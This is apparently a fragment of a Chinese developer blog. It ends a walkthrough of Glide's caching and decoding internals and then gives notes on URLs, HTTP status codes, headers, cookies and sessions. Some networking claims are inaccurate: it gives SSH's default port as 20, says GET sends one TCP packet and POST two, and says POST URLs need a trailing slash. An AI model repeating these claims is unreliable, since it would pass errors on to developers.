File(cacheDirectory, diskCacheName); //就是context.getCacheDir+&quot;image_manager_disk_cache&quot; //默认上限是250MB //由于这个Cache放在CacheDir里面，其他应用拿不到 } return cacheDirectory; } }, diskCacheSize); } 注意无论是decodeResultFromCache还是decodeSourceFromCache里都有类似的一段： Resource&lt;T&gt; transformed = loadFromCache(resultKey); Resource&lt;Z&gt; result = transcode(transformed); ///把一种资源转成另一种资源，比如把Bitmap的Resource转成一个ByteResource 4.2 SourceService这个线程池以及BitmapPool这一层缓存的出现 private Resource&lt;T&gt; decodeFromSourceData(A data) throws IOException { final Resource&lt;T&gt; decoded; if (diskCacheStrategy.cacheSource()) { decoded = cacheAndDecodeSourceData(data); } else { long startTime = LogTime.getLogTime(); decoded = loadProvider.getSourceDecoder().decode(data, width, height); // 这里面放进BitmapPool了 if (Log.isLoggable(TAG, Log.VERBOSE)) { logWithTimeAndKey(&quot;Decoded from source&quot;, startTime); } } return decoded; } 第四层缓存出现。。。LruBitmapPoolDecodeFromSource也是类似，判断是否允许Cache，通过DataFetcher获取数据这个数据可能是InputStream，也可能是ImageVideoWrapper。。。总之是一个可以提供数据的来源。如果可以Cache的话，先把数据写到lru里面，然后从lru里面取出来，从Source decode成想要的数据类型。例如从Stream转成Bitmap是这么干的StreamBitmapDecoder.java @Override public Resource&lt;Bitmap&gt; decode(InputStream source, int width, int height) { Bitmap bitmap = downsampler.decode(source, bitmapPool, width, height, decodeFormat); return BitmapResource.obtain(bitmap, bitmapPool); } 顺便还放进了LruBitmapPool（又一个实现了lru算法的缓存），Bitmap存在一个LruPoolStrategy接口实例的GroupedLinkedMap中。 4.3 回到主线程EngineRunnable的run方法跑在子线程，在run的最后就是用一个handler推到主线程了。有可能是从CacheService这个线程池里面的线程推过去的，也可能是SourceSevice这个线程池里面推过去的。 onResourceReady最终会走到GenericRequest的onResourceReady方法里 private void onResourceReady(Resource&lt;?&gt; resource, R result) { if (requestListener == null || !requestListener.onResourceReady(result, model, target, loadedFromMemoryCache, isFirstResource)) { GlideAnimation&lt;R&gt; animation = animationFactory.build(loadedFromMemoryCache, isFirstResource); target.onResourceReady(result, animation); //注意这句话就可以了 } } 最终会调到ImageViewTarget,AppWidgetTarget等Target（持有Request和View,View可能没有），这时候，直接调用ImageView.setImagBitmap等方法就可以了。图片设置完毕。 5. Glide除了普通的加载方法，还能用什么比较有意思的玩法 1.Glide加载Gif的原理在GifDecoder的 public synchronized Bitmap getNextFrame()方法里，Gif本质上是一帧帧的Frame数据，Glide将这些数据包装到GifFrame这个类中，每次想要获得下一帧的时候，就从bitmapPool中obtain Bitmap,同时从Frame中提取必要信息填充bitmap.Gif的显示是在GifDrawable的draw方法里面通过frameLoader.getCurrentFrame()获得当前帧的bitmap。android.graphics.Movie也能加载gif图片。只是Movie里面都是些native方法，glide的GifHeaderParser.java中的readContents方法里面用java方法实现了对gif帧的读取。从GifDecoder.read这个方法开始读就好了 2.GlideDrawableImageViewTarget中有这么一段注释： @Override public void onResourceReady(GlideDrawable resource, GlideAnimation&lt;? super GlideDrawable&gt; animation) { if (!resource.isAnimated()) { //TODO: Try to generalize this to other sizes/shapes. // This is a dirty hack that tries to make loading square thumbnails and then square full images less costly // by forcing both the smaller thumb and the larger version to have exactly the same intrinsic dimensions. // If a drawable is replaced in an ImageView by another drawable with different intrinsic dimensions, // the ImageView requests a layout. Scrolling rapidly while replacing thumbs with larger images triggers // lots of these calls and causes significant amounts of jank. float viewRatio = view.getWidth() / (float) view.getHeight(); float drawableRatio = resource.getIntrinsicWidth() / (float) resource.getIntrinsicHeight(); if (Math.abs(viewRatio - 1f) &lt;= SQUARE_RATIO_MARGIN &amp;&amp; Math.abs(drawableRatio - 1f) &lt;= SQUARE_RATIO_MARGIN) { resource = new SquaringDrawable(resource, view.getWidth()); } } super.onResourceReady(resource, animation); this.resource = resource; resource.setLoopCount(maxLoopCount); resource.start(); } Glide还可以用来纯粹的解码获得Bitmap. Glide.with(itemView.getContext()) //不用担心leak,RequestManager只是通过这个context获得了ApplicationContext，保留下来的是Application的context .load(R.drawable.image_41) .asBitmap() .centerCrop().into(new SimpleTarget&lt;Bitmap&gt;() { @Override public void onResourceReady(Bitmap resource, GlideAnimation&lt;? super Bitmap&gt; glideAnimation) { } @Override public void onDestroy() { super.onDestroy(); //其实这里面是空方法。 } }); 4.缓存路径获取 Glide.with(itemView.getContext()) .load(&quot;&quot;) .downloadOnly(new BaseTarget&lt;File&gt;() { @Override public void onResourceReady(File resource, GlideAnimation&lt;? super File&gt; glideAnimation) { Log.d(TAG, resource.getAbsoluteFile()); //放心，都在主线程 } @Override public void getSize(SizeReadyCallback cb) { } }); 根据之前的分析，打印出来的应该是context.getCacheDir+”image_manager_disk_cache”+”/xxxxxx.xxx” ，我没研究过后缀，不过这个后缀没意义吧。 在2017年的Droidcon2017NYC上，有一个演讲提到了关于图片尺寸大小和内存关系。大致情形就是在使用加载图片的时候，使用了一张3594pixel5421pixel(1900万像素)的图片（内存占用19million pixels X 4 bytes/pixel = 78MB），填进了一个50dp50dp的avatar中。而如果使用和ImageView大小一样的图片源的话(150pxX150px)，只需要90kb。这之间的内存消耗差异几乎是1000倍。这位speaker说的解决方案是请求图片是加上宽度和高度参数，或者调用Picasso的fit方法。目前看来，Glide从onSizeReady之后获取资源的每一步，读取缓存，读磁盘，解码图片这些过程都带上了width和height参数，所以应该也是不存在这种浪费内存的问题 - 总结 4层缓存（MemoryCache是内存中的一层，activeResources是一层（HashMap）,cacheService和SourceService这俩线程池干活需要一个DiskLruCache，另外decode还有一个bitmapPool，其实这不算缓存吧）。 默认的缓存大小考虑了屏幕尺寸和可用内存大小，科学合理。线程池的keepAlive数量上，一个是可用cpu核心数，所以快吧，一个是1。 全局只有一个Glide,一个页面只有一个RequestManager Target是一个接口，将资源的受众抽象成一个接口。 setTag会崩，ListView,RecyclerView原理,加载优化(prefetcher什么的，滑动过程中不去加载图片，Glide只是取消了之前的请求，并未去prefetch,其实可以啊，网络差的时候，downloadOnly就好了嘛，下次会快一点点) 传进去的是context，但它只是借用context.getApplicationContext，保留下来的是ApplicationContext，哪有那么容易leak。 生命周期挂钩什么，创建一个没有View的SupportFragment，还是做的很巧妙的。 泛型写的各种绕。。。 现在来回答那个问题：“如果你来设计一个图片加载框架，你会怎么设计？” 一个ImagerLoader应该具有的几个特性包括： 内存缓存和磁盘缓存,lru 做好图片压缩和bitmap重用(不可见图片及时回收)，避免oom (bitmap的宽高要根据View的大小确定) 对于不同资源来源能够提供对应的DataFetcher 对外提供start,stop,pause,resume等功能，必要时自动跟踪应用生命周期 耗时操作(io，解码)挪到后台 内存缓存可以设计两层bitmap缓存，一层是直接拿来用的(active)，一层是lru的。根据经验，一张bitmap占几个MB(高分辨屏幕)，而一个App能够使用的最大heap大小（ActivityManage.getMemoryClass）一般在100多MB，取其中的40%。完全能够做到内存中cache十几张bitmap。 外部调用者需要传入资源(url,File,res，etc)，及ImageView实例(我们也就有了Context)。在onPreDraw之后获得View的尺寸（这一点至关重要）。根据资源地址生成唯一的key，在bitmap pool中查找，然后在内存缓存(lru)中查找。如果还未找到的话提交DiskCache查找请求请求到DiskCache查找线程池，如果未找到提交请求到资源获取线程池(网络，文件，或者Res)，数据获取完成后cahe到disk并提交到主线程。多线程同步和生命周期追踪是难点。 updateGlide 4.0之后提供了更高的可定制度，如何为Glide设定OkHttpClient @GlideModule private class CustomGlideModule extends AppGlideModule { @Override public void registerComponents(Context context, Glide glide, Registry registry) { OkHttpClient client = new OkHttpClient.Builder() .readTimeout(15, TimeUnit.SECONDS) .connectTimeout(15, TimeUnit.SECONDS) .build(); OkHttpUrlLoader.Factory factory = new OkHttpUrlLoader.Factory(client); glide.getRegistry().replace(GlideUrl.class, InputStream.class, factory); } } compile &quot;com.squareup.okhttp3:okhttp:3.8.1&quot; compile &#39;com.github.bumptech.glide:glide:4.0.0&#39; compile (&#39;com.github.bumptech.glide:okhttp3-integration:4.0.0&#39;){ exclude group: &#39;glide-parent&#39; } Glide 4.0的加载顺序是在DecodeJob的runGenerator再到startNext再到loadData。看了下，本地缓存文件是使用ByteBufferFileLoader（就是用java nio去读取文件）的加载cache的顺序还是memory hit &gt; diskcache &gt; remote cache 。后面两个都放在glide-disk-cache-thread上做。在DecodeJob的onResourceDecoded方法中，有这么一个判断 if (dataSource != DataSource.RESOURCE_DISK_CACHE) { appliedTransformation = decodeHelper.getTransformation(resourceSubClass); transformed = appliedTransformation.transform(glideContext, decoded, width, height); } 也即DiskCacheStrategy.RESOURCE以及DiskCacheStrategy.ALL这种类型的缓存策略在第一次load完decode完之后。下次从disk中加载的时候直接无视transform。还有，从一个file中decode出bitmap的方法是从Downsampler.decodeStream这个方法里面调用BitmapFactory.decodeStream方法来做的 先尝试用ByteBufferGifDecoder去decode下载下来的资源（失败了丢一个GlideException出来） -&gt; 换下一个(ByteBufferBitmapDecoder) 这里面就是调用了BitmapFactory.decodeStream(Stream是包装了一个ByteBufferStream，读取的时候实际上调用了byteBuffer的相应方法，也就是使用了DirectByteBuffer的对应方法)这个方法来创建bitmap 关于DirectByteBuffer在glide中的使用java.nio.DirectByteBuffer这个class,从成员变量来看有MemoryBlock,以及FileChannel.MapModel public static ByteBuffer fromFile(@NonNull File file) throws IOException { RandomAccessFile raf = null; FileChannel channel = null; raf = new RandomAccessFile(file, &quot;r&quot;); channel = raf.getChannel(); return channel.map(FileChannel.MapMode.READ_ONLY, 0, fileLength).load(); //map就是mmap，返回的是MappedByteBuffer,这是一个抽象类，实际应该是DirectByteBuffer } 一些默认的配置如果外部没有设置的话是这样的 if (arrayPool == null) { arrayPool = new LruArrayPool(memorySizeCalculator.getArrayPoolSizeInBytes()); } if (memoryCache == null) { memoryCache = new LruResourceCache(memorySizeCalculator.getMemoryCacheSize()); } if (diskCacheFactory == null) { diskCacheFactory = new InternalCacheDiskCacheFactory(context); } tbd是否可以在onSizeReady之后修改url，添加上七牛的宽高参数？ 参考 Android Glide源码解析","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"网络通信手册","date":"2017-07-21T00:05:32.000Z","path":"2017/07/21/2017-07-21-network-manual/","text":"网络相关的查找手册 1. URI和URL是两件事根据wiki的解释URL是URI的子集，URL的一般格式包括三部分：资源类型、存放资源的主机域名，资源文件名。语法格式上,根据百度百科找到一个能用的： protocol :// hostname[:port] / path / [;parameters][?query]#fragment protocol 指使用的传输协议(http、file、https、mailto、ed2k、thunder等)hostname 是指存放资源的服务器的域名系统(DNS) 主机名或 IP 地址。有时，在主机名前也可以包含连接到服务器所需的用户名和密码（格式：username:password@hostname）。有时候是ip,有时候前面还带账号密码port http默认是80，https是443 ,ssh默认端口号是20path(路径) 由零或多个“/”符号隔开的字符串，一般用来表示主机上的一个目录或文件地址。parameters（参数）这是用于指定特殊参数的可选项。query(查询) 一般GET请求可以在这里面查找。可选，用于给动态网页（如使用CGI、ISAPI、PHP/JSP/ASP/ASP。NET等技术制作的网页）传递参数，可有多个参数，用“&amp;”符号隔开，每个参数的名和值用“=”符号隔开。fragment（信息片断）字符串，用于指定网络资源中的片断。例如一个网页中有多个名词解释，可使用fragment直接定位到某一名词解释。 Data URI scheme 1.1 Http的GET请求的url长度是有限制的(服务器和浏览器都限制了)Http1.1协议中并没有做这个限制，但通信的两端，服务器(Nginx和Tomcat)和客户端(浏览器厂商)都做了限制。参考一些浏览器的url长度限制，即url长度不能超过这么多个字符 IE : 2803 Firefox:65536 Chrome:8182 Safari:80000 Opera:190000再具体一点的话，就是下面这个我在百度里搜索zhihu这个词的时候GET /s?ie=utf-8&amp;f=8&amp;rsv_bp=0&amp;rsv_idx=1&amp;tn=baidu&amp;wd=zhihu&amp;rsv_pq=d66519eb000157d4&amp;rsv_t=4ce0B%2B8rfGgWxu9SAjGi7H5n5vylTydZebyyJXgD0JrPUSfBwp5zKxK9uKQ&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=6&amp;rsv_sug1=4&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;inputT=3737&amp;rsv_sug4=4444 HTTP/1.1 （从GET到这里不能超过8182个字） Host: www.baidu.com Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 DNT: 1 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.8 Cookie: BAIDUID=325243543:FG=1; PSTM=543534543; BIDUPSID=54353; pgv_pvi=5435; MCITY=-%3A; BD_HOME=0; BD_UPN=5435; H_PS_645EC=453453453; BDORZ=5435; BD_CK_SAM=1; PSINO=5; BDSVRTM=54; H_PS_PSSID=543; ispeed_lsm=2 另外，Cookie就是一个键值对，放在header里面，所以如果服务器对于Http请求头长度做了限制，Cookie也会受限制。 1.2 GET和POST的一些小区别GET只会发一个TCP包，POST发两个(一个是Header,一个是Body)。所以GET快一点，POST要求服务器长时间处于连接状态，可能造成服务器负载升高。一个比较实在的例子是，我在七牛的CDN上看到的收费价格1万次PUT/10万次GET的价格是一样的，不用想也知道GET对于服务器的压力要比PUT小 GET请求最后跟不跟斜杠”/“无所谓，但是POST请求最后面得跟”/“(back slash) 2. http请求本质上是发送了一堆字符给服务器另外,domain(域名)是指www.wikipedia.org这种，DNS会把它转成一个ip地址而在http请求的header中经常或看到Host: www.baidu.com\\r\\n 这样的一行，其实这是Http头字段的标准请求字段，总之就是标准。这个Host指的是服务器的域名，就是domain。wiki上的http名词解释 2.1 http statuscode有些常用的还是要记住的：比较好的一个表格 101 Switching Protocols (注意WebSocket)200 一切正常，对GET和POST请求的应答文档跟在后面。201 Created 比如刚刚向服务器提交了一次POST请求创建了一项资源301 Moved Permanently 客户请求的文档在其他地方，新的URL在Location头中给出，浏览器应该自动地访问新的URL。302 Found 类似于301，但新的URL应该被视为临时性的替代，而不是永久性的。304 Not Modified 客户端有缓冲的文档并发出了一个条件性的请求（一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用。307 这个其实和302一个意思，只是302会把GET、POST这些全部重定向到GET，这个是说你可以用之前的method再来一次401 Unauthorized403 Forbidden404 Not Found411 Length required414 Request URI Too Long URI太长（HTTP 1.1新）。这就是上面说的Http的GET请求的url长度是有限制的，是服务器方做出的限制500 Internal Server Error502 Bad Gateway 服务器作为网关或者代理时，为了完成请求访问下一个服务器，但该服务器返回了非法的应答。503 Service Unavailable 服务器由于维护或者负载过重未能应答。例如，Servlet可能在数据库连接池已满的情况下返回503。服务器返回503时可以提供一个Retry-After头。就是服务器扛不住了的意思504 Gateway Timeout 由作为代理或网关的服务器使用，表示不能及时地从远程服务器获得应答。（HTTP 1.1新）RFC在这里http状态码451，由于法律上的原因不能显示网页内容[http状态码429 too many requests] http 411的解释:(为了兼容HTTP/1.0应用程序，HTTP/1.1的请求消息体中必须包含一个合法的Content-Length头字段，除非知道服务器兼容HTTP/1.1。一个请求包含消息体，并且Content-Length字段没有给定，如果不能判断消息的长度，服务器应该用用400 (bad request) 来响应；或者服务器坚持希望收到一个合法的Content-Length字段，用 411 (length required)来响应。) 3. Header相关的首先看下请求百度首页的request和response Request（其实发送的时候每一行后面都跟了一个\\r\\n用于换行） GET / HTTP/1.1 Host: www.baidu.com Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 DNT: 1 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4 Cookie: BAIDUID=B41D39A8836273546754tC7F0C5DE315B64E2:FG=1; MCITY=-289%3A; Response(同样，无线电传输的时候是没有换行的概念的，每一行末尾都有一个\\r\\n) HTTP/1.1 200 OK Bdpagetype: 1 Bdqid: 0xa1524365407b7 Bduserid: 0 Cache-Control: private Connection: Keep-Alive Content-Encoding: gzip Content-Type: text/html; charset=utf-8 Cxy_all: baidu+9bdfb3567324332546a7cb482b3 Date: Sun, 23 Jul 2017 08:27:22 GMT Expires: Sun, 23 Jul 2017 08:26:51 GMT Server: BWS/1.1 Set-Cookie: BDSVRTM=0; path=/ Set-Cookie: BD_HOME=0; path=/ Set-Cookie: H_PS_PSSID=1430_210543_17001; path=/; domain=.baidu.com Strict-Transport-Security: max-age=172800 Vary: Accept-Encoding X-Powered-By: HPHP X-Ua-Compatible: IE=Edge,chrome=1 Transfer-Encoding: chunked 报文的语法：请求的格式 注意上面的“path=/”document.cookie = “username=cfangxu;path=/;domain=qq.com”如上：“www.qq.com” 与 “sports.qq.com” 公用一个关联的域名”qq.com”，我们如果想让 “sports.qq.com” 下的cookie被 “www.qq.com” 访问，我们就需要用到 cookie 的domain属性，并且需要把path属性设置为 “/“。cookie还有domain和path的概念 &lt;method&gt; &lt;request-URL&gt; &lt;version&gt; &lt;headers&gt; &lt;entity-body&gt; 响应的格式 &lt;version&gt; &lt;status&gt; &lt;reason-phrase&gt; &lt;headers&gt; &lt;entity-body&gt; request中常见的请求头包括： Accept：指定客户端能够接收的内容类型 Accept-Charset ：浏览器可以接受的字符编码集 Accept-Encoding:gzip, deflate, br客户端浏览器可以支持的压缩编码类型。比如gzip，用于压缩数据，节省带宽。 Accept-Language 指定Http客户端浏览器用来优先展示的语言示例: Accept-Language:zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4 Cache-Control： 参考具体操作百度百科写的很清楚可能的值包括： public 所有内容都将被缓存(客户端和代理服务器都可缓存)private 内容只缓存到私有缓存中(仅客户端可以缓存，代理服务器不可缓存)no-cache 必须先与服务器确认返回的响应是否被更改，然后才能使用该响应来满足后续对同一个网址的请求。因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，如果资源未被更改，可以避免下载。no-store 所有内容都不会被缓存到缓存或 Internet 临时文件中(和no-cache相比，“no-store”则要简单得多。它直接禁止浏览器以及所有中间缓存存储任何版本的返回响应，例如，包含个人隐私数据或银行业务数据的响应。每次用户请求该资产时，都会向服务器发送请求，并下载完整的响应。发现虽然设置了no-cache，但是没有设置ETag可以进行校验，最终还是从缓存里读取)。有些敏感信息，用户账户列表这种，就应该完全不缓存在本地。max-age=xxx (xxx is numeric) 缓存的内容将在 xxx 秒后失效, 这个选项只在HTTP 1.1可用, 并如果和Last-Modified一起使用时, 优先级较高 实际过程中我看到了这种：Cache-Control:private, no-cache, no-cache=Set-Cookie, no-store, proxy-revalidate，must-revalidate…. 而浏览器的前进后退，默认会从缓存里读取，完全不发请求。 缓存的优先级是： 先看缓存是否过期 发送Etag(如果有的话，服务器决策时304还是200)，发送If-None-Match 如果有Last-Modified的话，发送If-Modified-Since。 上述都失效的话，就当是全新的请求 Connection:keep-alive http1.1 默认为keep-alivehttp 1.0需要手动设置。原理就是服务器保持客户端到服务器的连接持续有效，避免了重新建立连接的开销(tcp三次握手)。这种情况下，客户端不能根据读取到EOF(-1)来判断传输完毕。有两种解决方案：对于静态文件，客户端和服务器能够知道其大小，使用content-length，根据这个判断数据是否已经接收完成；对于动态页面，不可能预先知道内容大小。可以使用Transfer-Encoding:chunked的模式进行传输。基本上就是服务器把文件分成几块，一块一块的发送过去。参考 Content-Type 代表文件类型。request只有POST请求中会有，Response中也会有。POST里面的Content-type有两种:一： Content-type: application/x-www-form-urlencoded;charset:UTF-8 //缺省值，表示提交表单。只能传键值对。比如 tel=13637829200&amp;password=123456 二： multipart/form-data //上传文件时用这种，既可以发送文本数据，也支持二进制上传。上面那个CharSet只是为了告诉服务器用的是哪种编码，能传二进制。比方说 ------WebKitFormBoundaryw0ZREBdOiJbbwuAg Content-Disposition: form-data; name=&quot;uploads[]&quot;; filename=&quot;278a516893f31a16feee.jpg&quot; Content-Type: image/jpeg ------WebKitFormBoundaryw0ZREBdOiJbbwuAg-- 响应头中的Content-Type示例： Content-Type:image/gif或者Content-Type: text/html;charset=utf-8 参考 Date:Sun, 23 Jul 2017 07:39:47 GMT 这就是当前的GMT时间 DNT: 1 Do Not Track（当用户提出启用“请勿追踪”功能后，具有“请勿追踪”功能的浏览器会在http数据传输中添加一个“头信息”（headers），这个头信息向商业网站的服务器表明用户不希望被追踪。这样，遵守该规则的网站就不会追踪用户的个人信息来用于更精准的在线广告。） Etag 用于比较客户端请求的文件的内容是否发生了改变。跟Last-Modified的作用差不多。最简单的用hash值就可以了。 Expires:Mon, 01 Jan 1990 00:00:00 GMT 过期时间，这里应该是永不过期 HOST 服务器的域名(domain)或者ip地址Host: www.baidu.com If-Modified-Since:Fri, 24 Feb 2017 12:37:22 GMT 这个跟缓存有关 If-None-Match:”abf29cbe9a8ed21:0” 还是缓存 Pramga 和Cache-Control一样实例： Pramga: no-cache 相当于 Cache-Control： no-cache。 User-Agent 这个代表用的是哪种浏览器(客户端)，写爬虫的时候找到一大堆User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36Android设备发出来的可能长这样： Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; HTC_D820u Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30ios设备发出来的长这样: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4至少Chrome团队给出了自家浏览器的UA Referer 一般是一个url，代表当前请求时从哪个页面发出的，写爬虫有用 Header其实就是个字典，比较麻烦的就是Cache-Control了，这个还要结合If-None-Match，Etag来看。需要用的时候再看应该也不迟。 Vary比较有意思：server端每次接收到一个请求，会根据request的一些特定属性来确认之前有没有别的客户请求过同样的资源，要是有的话，直接返回就好了。而这个判定是否请求的同一个资源的标准就是Vary(上一次Response中会返回{Vary:Accept-Encoding,Vary:”SomeCustomHeaerKey”})，vary可以写多个。从百度的Response来看，一般这个值设定为Accept-Encoding就好了。经常使用Vary: Accept-Encoding的一个原因是，有些客户端不支持gzip。Accept-Encoding一般长这样： Accept-Encoding:gzip,deflate,sdch所以缓存服务器要是把gzip的资源发给了不支持gzip的客户端，那就是错误了。增加 Vary: Accept-Encoding 响应头，上游服务明确告知缓存服务器按照 Accept-Encoding 字段的内容，分别缓存不同的版本；nginx里面加上这一条就好了：gzip_vary on;mozilla对于Vary这个header的描述是这样的，这个属于content-negotiation的一部分.所以这个Header是后端服务器写给缓存服务器看的，顺带暴露在客户端里面了.关于content-negotation，无非两种，服务端列出多项选择（这份资源可用版本的列表），返回Http300(multiple choices)这个header，让前端自己去选。另一种就是后台根据前段发来的request中的一些信息做出选择（server-driven negotiation，主要看Accept，Accept-Charset,Accept-Encoding,Accept-Language这些东西）。所以常常会看到请求中Accept-Language: zh-CN,zh;q=0.9 这个q表示有多少的权限，所以这个比重应该是参与了content-negotiation的计算。 Vary:Origin和CORS的关系CORS请求会带上Origin请求头，用来向别人的网站表明自己是谁。Vary: Origin可以让同一个URL请求根据ORIGIN这个请求头返回不同的缓存版本。实践中，如果Access-Control-Allow-Origin的响应头不是写成了*号的话，就应该加上Vary: Origin，以此避免不同的Origin获得的缓存版本错乱。 strict-transport-securitystrict-transport-security: max-age=31536000 max-age=&lt;expire-time&gt; 设置在浏览器收到这个请求后的&lt;expire-time&gt;秒的时间内凡是访问这个域名下的请求都使用HTTPS请求。 WikI上比较完整 Transfer-Encoding: chunked 有时候要传输的Content-Length实在太大，服务器计算长度需要开很大的Buffer，干脆把文件分块传输。wiki的解释，注意此时content-length无效。浏览器对于缓存的实际处理，是否过期由Cache-Control标识的max-age和Expires判断。Cache-Control的优先级较高。From Chrome简单来说就是先看客户端是否Expire，然后去服务器看下Etag,最后看Last-Modified那个。 一个response里面出现多个相同的key的header是符合标准的 实际的例子 X-Akamai-Session-Info: name=ADVPF_PREFETCHABLE_TRACE; value=docs.oracle.com: TDCOUPLED ANY X-Akamai-Session-Info: name=ENABLE_SD_POC; value=yes X-Akamai-Session-Info: name=NL_22357_ORACLEDEVELOPERIPBLOCKL_NAME; value=Oracle Developer IP Block List X-Akamai-Session-Info: name=AKA_PM_NETSTORAGE_ROOT; value=/319188 X-Akamai-Session-Info: name=AKA_PM_SR_NODE_ID; value=0 X-Akamai-Session-Info: name=FASTTCP_RENO_FALLBACK_DISABLE_OPTOUT; value=on X-Akamai-Session-Info: name=ADVPF_PREFETCHABLE_CATEGORY; value=TDCOUPLED_ANY X-Akamai-Session-Info: name=PMUSER_COUNTRY_CODE; value=CN; full_location_id=country_code X-Akamai-Session-Info: name=NL_23268_ORACLESHOPIPBLOCKLIST_NAME; value=Oracle Shop IP Block List 实际的效应等同于将所有的values filed用逗号分隔之后串在一起丢在一个header后面。 from wiki page: Akamai是一家总部位于美国马萨诸塞州剑桥市的内容分发网络和云服务提供商，是世界上最大的分布式计算平台之一，承担了全球15-30%的网络流量。 补上一个http statuscode = 302的实际例子吧，今晚看腾讯新闻的时候抓到的 Request URL:http://tdd.3g.qq.com/17421/e8475fe7-7418-43bf-9be7-c6b116730cac.gif?a=0.33637654883709955&amp;b=1511790303321 Request Method:GET Status Code:302 Found Remote Address:123.151.152.123:80 Referrer Policy:no-referrer-when-downgrade Request Header Accept:image/webp,image/apng,image/*,*/*;q=0.8 Accept-Encoding:gzip, deflate Accept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection:keep-alive Cookie:XX=SDSDSADSA0; SADSAD=21FDGFDGF; //cookie是我编的 DNT:1 Host:tdd.3g.qq.com Referer:http://new.qq.com/omn/20171127A0OHHD00 User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36 Response Header Cache-Control:max-age=0 Connection:close Content-Length:0 Date:Mon, 27 Nov 2017 13:45:04 GMT Expires:Mon, 27 Nov 2017 13:45:04 GMT Location:http://210.22.248.167/tdd.3g.qq.com/17421/e8475fe7-7418-43bf-9be7-c6b116730cac.gif?mkey=5a1c30156df5812a&amp;f=4f20&amp;c=0&amp;a=0.33637654883709955&amp;b=1511790303321&amp;p=.gif //注意这个新的location Server:nws 1.2.15 4. Cookie和Session4.1 Cookie先看Wiki上的解释: 指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密.主要是因为Http是无状态的，服务器不知道这一次连接和上一次连接是不是同一个客户端Cookie总是保存在客户端中，按在客户端中的存储位置，可分为内存Cookie和硬盘Cookie。内存Cookie由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘Cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久Cookie和持久Cookie。 Cookie的一些缺点，直接照搬WiKi了 Cookie会被附加在每个HTTP请求中，所以无形中增加了流量。(其实这里面只应该放“每次请求都要携带的信息”) 由于在HTTP请求中的Cookie是明文传递的，所以安全性成问题。（除非用HTTPS） Cookie的大小限制在4KB左右。对于复杂的存储需求来说是不够用的。 一个域名下存放的cookie的个数是有限制的，不同的浏览器存放的个数不一样,一般为20个。 cookie也可以设置过期的时间，默认是会话结束的时候，当时间到期自动销毁 另外，不同域名是无法共享浏览器端本地信息，包括cookies，这即是跨域问题。百度是不能读取爱奇艺的Cookie的，这是安全性问题。需要注意的是，虽然网站images.google.com与网站www.google.com同属于Google，但是域名不一样，二者同样不能互相操作彼此的Cookie。必须域名一样才能操作。Java中把Cookie封装成了javax.servlet.http.Cookie类，直接用就可以了。 Cookie并不提供修改、删除操作。如果要修改某个Cookie，只需要新建一个同名的Cookie，添加到response中覆盖原来的Cookie。 对了，在众多的Header中Cookie一般长这样: Cookie:key1=value1;key_2=value2;key_3=value3;JSessionID=24DHFKDSFKJ324329NSANDI124EH故意把最后一个JSESSION写出来是因为底下要讲Session了嘛 4.2 Session参考文章Header(字典)里面装着一个Cookie(字典)，Cookie里面有个键值对:JSESSIONID:SESSIONID宏观上就是这么个关系。 Cookie保存在客户端，Session保存在服务器端。Session是在客户端第一次访问的时候由服务器创建的，session一般存储在redis中（ram），客户端始终只有sessionId。第二次请求的时候(session还未过期)，浏览器会加上sessionId=XXXXX。服务器接收到请求后就得到该请求的sessionID，服务器找到该id的session返还给请求者（Servlet）使用。一个会话只能有一个session对象，对session来说是只认id不认人。 Session超时：超时指的是连续一定时间服务器没有收到该Session所对应客户端的请求，并且这个时间超过了服务器设置的Session超时的最大时间。Session的maxAge一般为-1，表示仅当前浏览器内有效，关闭浏览器就会失效。 知乎上有一段比较好的描述,这里直接引用了。http是无状态的协议，客户每次读取web页面时，服务器都打开新的会话，而且服务器也不会自动维护客户的上下文信息，那么要怎么才能实现网上商店中的购物车呢，session就是一种保存上下文信息的机制，它是针对每一个用户的，变量的值保存在服务器端，通过SessionID来区分不同的客户,session是以cookie或URL重写为基础的，默认使用cookie来实现，系统会创造一个名为JSESSIONID的输出cookie，我们叫做session cookie,以区别persistent cookies,也就是我们通常所说的cookie,注意session cookie是存储于浏览器内存中的，并不是写到硬盘上的，这也就是我们刚才看到的JSESSIONID，我们通常情是看不到JSESSIONID的，但是当我们把浏览器的cookie禁止后，web服务器会采用URL重写的方式传递Sessionid，我们就可以在地址栏看到 